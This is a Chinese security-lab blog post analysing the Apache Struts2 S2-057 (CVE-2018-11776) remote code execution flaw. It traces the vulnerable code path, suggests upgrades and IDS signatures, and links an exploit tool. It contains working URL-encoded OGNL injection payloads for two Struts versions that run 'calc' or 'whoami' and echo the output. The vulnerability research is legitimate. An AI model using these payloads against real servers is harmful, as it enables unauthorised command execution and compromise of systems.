**Struts2-057/CVE-2018-11776两个版本RCE漏洞分析（含EXP）**

**Ivan\@360云影实验室**

**2018年08月24日**

0x01 前言
=========

2018年8月22日，Apache Strust2发布最新安全公告，Apache
Struts2存在远程代码执行的高危漏洞（S2-057/CVE-2018-11776），该漏洞由Semmle
Security Research team的安全研究员Man
YueMo发现。该漏洞是由于在Struts2开发框架中使用namespace功能定义XML配置时，namespace值未被设置且在上层动作配置（Action
Configuration）中未设置或用通配符namespace，可能导致远程代码执行。同理，url标签未设置value和action值且上层动作未设置或用通配符namespace时也可能导致远程代码执行，经过笔者自建环境成功复现漏洞且可以执行命令回显，文末有你们想要的
!

0x02 漏洞利用
=============

**笔者搭的环境分别是Strust2 2.3.20 版本和 Strust2
2.3.34版本，漏洞利用大致分为三种方式：数值计算、弹出计算器、 命令回显。**

2.1、数值计算
-------------

数值计算相对最简单，在URL上指定 %{100+200} 就可以发生跳转，得到计算的结果

![](media/94726c86e6004ee27a8dc77d96af4ef2.png)

2.2、弹出计算器
---------------

2.3.20 版本的POC如下：

| /%24%7B%23_memberAccess%3D\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS%2C\@java.lang.Runtime\@getRuntime%28%29.exec%28%27calc.exe%27%29%7D/index.action |
|------------------------------------------------------------------------------------------------------------------------------------------------------|


![](media/cbda8636cf368f61135ce07397ad16ce.png)

2.3.34 版本参考的POC如下：

| /%24%7B%28%23dm%3D\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28\@com.opensymphony.xwork2.ognl.OgnlUtil\@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D\@java.lang.Runtime\@getRuntime%28%29.exec%28%22calc%22%29%29%7D/index.action |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


![](media/7abe1a9a64e93352939d25c7770b935b.png)

2.3、命令回显
-------------

两个版本都是利用com.opensymphony.xwork2.dispatcher.HttpServletResponse对象去打印命令执行后的回显数据

2.3.20 版本的POC如下：

| /%24%7B%28%23_memberAccess%3D\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28\@org.apache.commons.io.IOUtils\@toString%28\@java.lang.Runtime\@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action |
|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


2.3.34 版本的POC如下：

| /%24%7B%28%23dm%3D\@ognl.OgnlContext\@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28\@com.opensymphony.xwork2.ognl.OgnlUtil\@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28\@org.apache.commons.io.IOUtils\@toString%28\@java.lang.Runtime\@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action |
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


攻击后效果如下图

![](media/093165b99da65dd906175514be40d3ca.png)

0X03 漏洞分析
=============

在分析漏洞之前，需要配置struts.xml文件，这个文件就是struts2的核心配置文件，大多数的时候增减配置都需要操控这里；

![](media/899737735005243606a63a9e74e0128e.png)

总共两处需要注意，第一处一定要配置struts.mapper.alwaysSelectFullNamespace = true
，否则不能触发漏洞，这个配置的目的是设定是否一直在最后一个斜线之前的任何位置选定NameSpace；第二处result标签返回的类型选择
“ redirectAction 或 chain“ ,
只有这两个配置选项的值是可以将action转发或者重定向；关于type具体可以参考下图

![](media/7292e2ae581bf86a70ab8d07a8060f18.png)

说完了配置，开始动态分析。漏洞位于
struts2-core.jar!/org/apache/struts2/dispatcher/ServletActionRedirectResult.class

![](media/8beae58966835ff61dea31b3bb5675cb.png)

This.namespace这个成员的值来自于getNamespace()方法，再通过getUriFromActionMapping()返回URI字符串；

![](media/3e27519ab12454f4a1d13682c87755bf.png)

通过getUriFromActionMapping获取的值赋给了tmpLocation变量，接着表达式进入setLocation方法

![](media/7a1b9d05e757a111e810363166d8eaa4.png)

再通过super.execute方法调用了ServletActionResult ，
而在execute方法体内跟进了conditionalParse方法，在这个方法内调用了ONGL执行的关键方法translateVariables。

![](media/02bb7f6419984f55f4f77157ca9cf9ae.png)

获得的param值传入到translateVariables()方法内，最终在OnglTextPaser里导致了OGNL表达式执行。

![](media/14b7334b020914ff8aa1788ce23aa34a.png)

![](media/675a1234cda8ccf988e4e751a900e0a5.png)

再弹出计算器后获得lastFinalLocation的值为当前执行后的句柄，这个值作为响应跳转的action地址
，也就是在浏览器中弹出计算器后在地址栏中出现的URI

![](media/a3027e83211837c6b6de145b1eb4584c.png)

到这里弹出计算器的分析到此为止，接下来看下基于命令执行回显结果的分析，基本上流程和上述一样，唯一不同之处lastFinalLocation返回的值是NULL，这也就引发出提交后没有做302的跳转，依旧是当前的action，并且返回的值是200

![](media/33791c224f4b07b693c532c39fbe2860.png)

![](media/e1aca1afc0fc3d10e4e865dc5d96adef.png)

知道了原理后小同事用python实现了自动化利用工具，此工具用途仅供学习研究；

![image.png](media/62cbbac3c4b09ef91758b028481d7fc8.jpg)

0x04 防御措施
=============

1.  将框架版本升级到官方最新版本；

2.  对于Web应用来说，尽量保证代码的安全性；

3.  对于IDS规则层面来说，数值计算和弹计算器返回的状态码都是302，并且Location跳转字段含有特征句柄字符串；如果是命令回显返回的200状态码，且有命令结果输出；

0x05 小结
=========

文章中提及的python EXP下载地址： <https://github.com/Ivan1ee> ；

0x06 参考链接
=============

<https://cwiki.apache.org/confluence/display/WW/S2-057>

<https://lgtm.com/blog/apache_struts_CVE-2018-11776>

<https://blog.csdn.net/madison__/article/details/55671426>

# 云影实验室长期招聘安全开发工程师 (可实习) / 安全研究员(样本沙箱方向)岗位，有意者可联系笔者微信号  

![](media/wechat.png)
